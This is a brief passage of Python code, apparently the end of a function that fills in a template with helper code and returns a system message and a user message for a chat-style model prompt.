        io_helper_code=io_helper_code,
    )

    return [
        {"role": "system", "content": system_content},
        {"role": "user", "content": user_content},
    ]
